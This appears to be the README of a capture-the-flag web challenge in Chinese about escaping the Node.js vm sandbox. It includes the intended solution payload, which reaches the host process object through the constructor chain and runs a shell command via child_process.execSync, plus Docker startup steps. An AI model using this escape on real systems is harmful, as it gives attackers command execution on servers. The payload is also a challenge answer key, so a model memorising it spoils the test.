# Web - 1zvm

lamaper

**tags**: vm沙箱逃逸 ; NodeJS ; 原型链污染

## flag设置

本题预期通过构造沙箱逃逸payload鉴权获得/flag

## 题目说明

本题意图考察Node JS vm沙箱逃逸

一种预期的payload是：
```js
(() => {
    const esc = this.constructor.constructor("return process")();
    return esc.mainModule.require('child_process').execSync('whoami').toString();
    })()
```

## 环境说明

本题采用 `NodeJS` 的基础环境，默认暴露端口位于8888

## 如何使用

本题在dockercompose中启用了volumes以方便调试，正式环境中可以删除。

使用 `./docker/docker-compose.yml` 内的 `docker-compose` 文件实现一键启动测试容器

```shell
cd ./docker
docker compose up -d --build
```